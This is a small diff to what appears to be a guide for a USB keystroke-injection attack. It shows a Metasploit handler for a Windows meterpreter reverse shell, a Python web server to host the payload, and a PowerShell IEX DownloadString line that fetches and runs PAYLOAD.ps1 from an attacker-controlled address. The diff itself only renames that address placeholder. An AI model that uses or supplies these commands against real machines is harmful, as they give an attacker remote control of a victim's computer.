@@ -8,6 +8,6 @@ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp
 ### Start python http server<br/>
 python3 -m http.server 80<br/>
 ### Ducky script will download and execute powershell script opening meterpreter session<br/>
-IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/PAYLOAD.ps1
+IEX(New-Object System.Net.WebClient).DownloadString('http://IPaddr/PAYLOAD.ps1
 
 
